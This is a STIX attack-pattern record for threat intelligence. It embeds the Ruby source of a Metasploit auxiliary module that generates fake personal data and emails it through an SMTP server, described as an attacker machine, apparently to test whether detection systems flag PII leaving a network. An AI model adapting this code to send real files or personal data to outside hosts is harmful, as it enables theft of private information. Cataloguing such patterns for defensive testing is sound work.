{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9065fcc9-93d1-40bc-8e7b-0ed45292ed8e",
    "created": "2024-08-14T16:32:57.987961Z",
    "modified": "2024-08-14T16:32:57.987965Z",
    "name": "VSploit Email PII",
    "description": " This auxiliary reads from a file and sends data which should be flagged via an internal or external SMTP server.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/vsploit/pii/email_pii.rb",
            "external_id": "email_pii.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  #\n  # This module sends pii via an attacker smtp machine\n  #\n  include Msf::Exploit::Remote::SMTPDeliver\n  include Msf::Auxiliary::PII\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VSploit Email PII',\n      'Description'    => %q{\n          This auxiliary reads from a file and sends data which\n      should be flagged via an internal or external SMTP server.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>  ['willis']\n    ))\n      register_options(\n        [\n          OptString.new('RHOST', [true, \"SMTP server address\",'127.0.0.1']),\n          OptPort.new('RPORT', [true, \"SMTP server port\", 25])\n        ])\n  end\n\n  def run\n\n    msg = Rex::MIME::Message.new\n    msg.mime_defaults\n    msg.subject = datastore['SUBJECT']\n    msg.to = datastore['MAILTO']\n    msg.from = datastore['MAILFROM']\n\n    data = create_pii\n\n    msg.add_part(data, \"text/plain\")\n    msg.add_part_attachment(data, rand_text_english(10))\n\n    resp = send_message(msg.to_s)\n  end\nend\n"
}